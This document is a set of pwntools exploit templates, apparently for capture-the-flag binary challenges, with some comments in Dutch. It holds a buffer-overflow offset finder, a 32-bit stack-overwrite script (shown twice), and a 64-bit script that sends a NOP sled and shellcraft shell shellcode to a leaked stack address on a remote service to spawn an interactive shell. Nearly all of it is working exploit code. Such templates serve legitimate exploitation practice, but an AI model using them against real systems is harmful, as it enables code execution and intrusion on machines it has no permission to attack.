
```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Build the payload
payload = flat({
    offset: [

    ]
})

# Send the payload
io.sendlineafter(b'>', payload)
io.recvuntil(b'Thank you!')

# Got Shell?
io.interactive()
```
```
from pwn import *
import time

#r = remote("127.0.0.1",6666)
r = process('./pwn')

elf = ELF('./pwn')
addr_main = elf.symbols['main']

#print (r.recvline())

payload = (b"A")*100
payload += (b"B")*4
payload += p32(0xc0d3, endian='little')
payload += p32(0xc0ff33, endian='little')
payload += (b"F")*4

with open("input.txt", "wb") as filp:
	filp.write(payload)

#r.sendline(payload)

gdb.attach(r,gdbscript="""
	b *0x0000555555400959
	r < input.txt
	x/x $rbp-0x4
	""")
#print(r.recvline())
```

# pwntools template x64

```
from pwn import *
import time

#r = process('./pwn104.pwn104')
r = remote("127.0.0.1", 9004)

# creeer shellcode 
context.update(arch="amd64", os="linux")
buf = asm(shellcraft.sh())

answ = r.recvuntil(b'waiting for you at ')
addr = r.recvline()
hexaddr = int(addr, 16)
# andere offset dan begin buffer
hexaddr = hexaddr + 96
print("Het adres is: %s" % str(addr))

# offset lengte 80
payload = b"A"*80
payload += b"B"*8
payload += p64(hexaddr, endian='little')
payload += b"\x90"*20
payload += buf

# Schrijf naar bestand voor gebruik in gdbscript
with open("input.txt", "wb") as filp:
	filp.write(payload)

r.sendline(payload)
r.interactive()


# Onderstaande is gdbscript

# gdb.attach(r,gdbscript="""
# 	b *0x000000000040124e
# 	r < input.txt 
# 	bt
# 	""")
```

# pwntools template x32

```
from pwn import *
import time

#r = remote("127.0.0.1",6666)
r = process('./pwn')

elf = ELF('./pwn')
addr_main = elf.symbols['main']

#print (r.recvline())

payload = (b"A")*100
payload += (b"B")*4
payload += p32(0xc0d3, endian='little')
payload += p32(0xc0ff33, endian='little')
payload += (b"F")*4

with open("input.txt", "wb") as filp:
	filp.write(payload)

#r.sendline(payload)

gdb.attach(r,gdbscript="""
	b *0x0000555555400959
	r < input.txt
	x/x $rbp-0x4
	""")

#print(r.recvline())
```